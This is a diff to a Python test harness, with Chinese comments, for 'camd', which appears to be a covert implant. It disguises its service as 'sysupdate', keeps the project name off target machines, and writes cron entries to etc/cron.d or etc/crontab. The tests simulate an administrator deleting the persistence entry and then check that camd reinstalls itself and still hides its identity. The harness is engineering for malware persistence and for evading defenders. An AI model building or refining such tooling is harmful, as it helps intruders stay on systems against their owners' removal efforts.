@@ -37,6 +37,77 @@ CAND = os.path.join(REPO, "agent_windows", "build", "linux", "camd")
 SVC = "sysupdate"          # 伪装服务名；项目名不得出现在目标机落点上
 PROJECT_MARKER = "dayanjing"
 
+# ---- cron 落点：两种形态，判据必须都认 ----
+# camd 内部 persist 按 $PREFIX/etc 的发行版特征探测落点形态：
+#   etc/cron.d/<SVC>   Debian/RHEL 系。该目录不是 Vixie cron 的原生特性，
+#                      而是发行版补丁——上游 pathnames.h 只有 CRON_DENY、
+#                      没有 CRON_DIR，BSD/精简系统上写在这里永不触发。
+#   etc/crontab        通用回退，所有实现都读它。
+# 空假根没有任何发行版特征 -> 探测结果"未知" -> 回退到 etc/crontab。
+# 只认 cron.d 时，本守卫会表现为"删除前不存在 / 删除未发生 / 未装回"
+# 四条同时变红——症状与"自愈功能失效"完全一致，排查方向会被带向
+# camd 而不是判据过期。故两种形态都认，且共享文件必须命中本次写入的
+# 标记行才算数（否则系统自带的 crontab 会让断言恒绿）。
+def _marker_from_impl():
+    """从 persist.c 派生 marker，绝不硬编码。
+
+    硬编码过一次：写成 "managed-<SVC>"，而实现里是 "# do-not-edit:managed"。
+    后果是 cron_which() 对 crontab 形态永远返回 None，F2 的四条断言
+    （删除前存在 / 删除已发生 / 触发自愈 / 已装回）同时变红——症状与
+    "自愈功能失效"完全一致，排查方向被带向 camd 而实际是判据不同源。
+    """
+    src = os.path.join(REPO, "09_persistence", "src", "persist.c")
+    try:
+        body = open(src, encoding="utf-8", errors="ignore").read()
+    except OSError:
+        return None
+    m = re.search(r'#define\s+MARKER\s+"([^"]*)"', body)
+    return m.group(1) if m else None
+
+
+CRON_MARKER = _marker_from_impl()
+if CRON_MARKER is None:
+    print("[FATAL] 无法从 09_persistence/src/persist.c 派生 MARKER")
+    sys.exit(2)
+
+
+def cron_which(root):
+    """假根内本次安装写入的 cron 条目所在文件路径；无则 None。"""
+    cd = os.path.join(root, "etc", "cron.d", SVC)
+    if os.path.exists(cd):
+        return cd
+    ct = os.path.join(root, "etc", "crontab")
+    if os.path.exists(ct):
+        try:
+            body = open(ct, encoding="utf-8", errors="ignore").read()
+        except OSError:
+            return None
+        if CRON_MARKER in body:
+            return ct
+    return None
+
+
+def cron_remove(root):
+    """模拟管理员清除 cron 驻留条目；返回是否真的删掉了东西。"""
+    p = cron_which(root)
+    if p is None:
+        return False
+    if os.path.basename(os.path.dirname(p)) == "cron.d":
+        os.remove(p)
+        return True
+    try:
+        lines = open(p, encoding="utf-8", errors="ignore").read().splitlines(True)
+    except OSError:
+        return False
+    keep = [l for l in lines if CRON_MARKER not in l]
+    if len(keep) == len(lines):
+        return False
+    try:
+        open(p, "w", encoding="utf-8").write("".join(keep))
+    except OSError:
+        return False
+    return True
+
 PASS = 0
 FAIL = 0
 
@@ -106,7 +177,6 @@ def run_camd(port, got, root, extra, delete=False, batches=3):
            "--interval-ms", "600",
            "--frames", "1"] + extra
 
-    cron_path = os.path.join(root, "etc", "cron.d", SVC)
     state = {"deleted": False, "was_there": False}
 
     def deleter():
@@ -118,10 +188,9 @@ def run_camd(port, got, root, extra, delete=False, batches=3):
                 break
             time.sleep(0.05)
         time.sleep(0.15)
-        state["was_there"] = os.path.exists(cron_path)
-        if os.path.exists(cron_path):
-            os.remove(cron_path)
-            state["deleted"] = True
+        state["was_there"] = cron_which(root) is not None
+        if state["was_there"]:
+            state["deleted"] = cron_remove(root)
 
     p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          env=env, text=True)
@@ -167,16 +236,16 @@ def main():
     rc2, err2, st2 = run_camd(port, got, root2, [], delete=True)
     r2 = parse_stats(err2, "rechecks")
     h2 = parse_stats(err2, "heals")
-    cron2 = os.path.join(root2, "etc", "cron.d", SVC)
+    cron2 = cron_which(root2)
     ck("F2 删除前 cron 确实存在", st2["was_there"], "（否则用例未进入目标路径）")
     ck("F2 删除动作已发生", st2["deleted"], "")
     ck("F2 camd 正常结束", rc2 == 0, "rc=%s" % rc2)
     ck("F2 自检发现缺段", r2 > 0, "rechecks=%s" % r2)
     ck("F2 触发自愈重装", h2 >= 1, "heals=%s" % h2)
-    ck("F2 cron 被装回", os.path.exists(cron2), cron2)
-    if os.path.exists(cron2):
+    ck("F2 cron 被装回", cron2 is not None, cron2 or "无")
+    if cron2:
         try:
-            body = open(cron2).read()
+            body = open(cron2, encoding="utf-8", errors="ignore").read()
         except Exception:
             body = ""
         ck("F2 装回的 cron 不含项目名", PROJECT_MARKER not in body, "")
@@ -186,9 +255,9 @@ def main():
     root3 = tempfile.mkdtemp(prefix="psh3_")
     rc3, err3, st3 = run_camd(port, got, root3, ["--persist-recheck", "0"], delete=True)
     h3 = parse_stats(err3, "heals")
-    cron3 = os.path.join(root3, "etc", "cron.d", SVC)
+    cron3 = cron_which(root3)
     ck("F3 关闭自检后不重装", h3 == 0, "heals=%s" % h3)
-    ck("F3 关闭自检后 cron 未恢复", not os.path.exists(cron3),
+    ck("F3 关闭自检后 cron 未恢复", cron3 is None,
        "（证明 F2 能区分开/关，非恒绿）")
     shutil.rmtree(root3, ignore_errors=True)
 
